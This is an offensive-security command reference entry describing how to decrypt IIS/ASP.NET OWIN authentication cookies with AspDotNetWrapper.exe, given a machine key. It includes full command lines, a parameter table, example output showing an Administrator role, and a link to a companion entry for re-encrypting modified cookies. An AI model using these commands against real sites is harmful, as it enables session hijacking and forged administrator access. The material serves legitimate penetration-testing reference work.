---
id: 26f0eb08-50d1-4651-8059-4b469870141c
name: decrypt-iis-cookie-with-aspdotnetwrapper
type: command
executor: cmd
data: >-
  AspDotNetWrapper.exe --keypath $_KEYPATH --cookie $_COOKIE_VALUE --decrypt
  --purpose=owin.cookie --valalgo=hmacsha512 --decalgo=aes
output: null
created_at: '2023-04-06T03:55:53.437641+00:00'
updated_at: '2023-04-06T03:55:53.449842+00:00'
platforms:
  - Windows
tags:
  - iis
  - cookie-decryption
  - defense-evasion
verified: true
validated: true
---

# decrypt-iis-cookie-with-aspdotnetwrapper

## Command

```cmd
AspDotNetWrapper.exe --keypath $_KEYPATH --cookie $_COOKIE_VALUE --decrypt --purpose=owin.cookie --valalgo=hmacsha512 --decalgo=aes
```

## Description

This command decrypts an encrypted ASP.NET cookie using the IIS machine key specified in a configuration file. It targets OWIN-based authentication cookies, outputting the plaintext to Decrypted.txt. Use this during web app testing to inspect session data after obtaining the machine key.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| --keypath $_KEYPATH | Path to the machine key file (e.g., web.config excerpt) | Yes |
| --cookie $_COOKIE_VALUE | The encrypted cookie value (base64 string) | Yes |
| --decrypt | Flag to perform decryption | Yes |
| --purpose=owin.cookie | Specifies the cookie purpose for validation | Yes |
| --valalgo=hmacsha512 | Validation algorithm (HMACSHA512) | Yes |
| --decalgo=aes | Decryption algorithm (AES) | Yes |

## Examples

### Basic Usage

```cmd
AspDotNetWrapper.exe --keypath C:\MachineKey.txt --cookie .ASPXAUTH=ABC123DEF --decrypt --purpose=owin.cookie --valalgo=hmacsha512 --decalgo=aes
```

### Advanced Usage

If the key file is in a different location:

```cmd
AspDotNetWrapper.exe --keypath D:\config\MachineKey.txt --cookie $_COOKIE_VALUE --decrypt --purpose=owin.cookie --valalgo=hmacsha512 --decalgo=aes
```

## Expected Output

Successful execution produces:

```
Decryption successful. Output saved to Decrypted.txt
```

The Decrypted.txt file contains plaintext like:

```
{"userId":"admin","role":"Administrator"}
```

Errors may include "Invalid machine key" if the key is malformed.

## Related

- [[procedures/IIS-Machine-Key-Cookie-Decryption-and-Encryption]]
- [[commands/encrypt-modified-cookie-with-aspdotnetwrapper]]
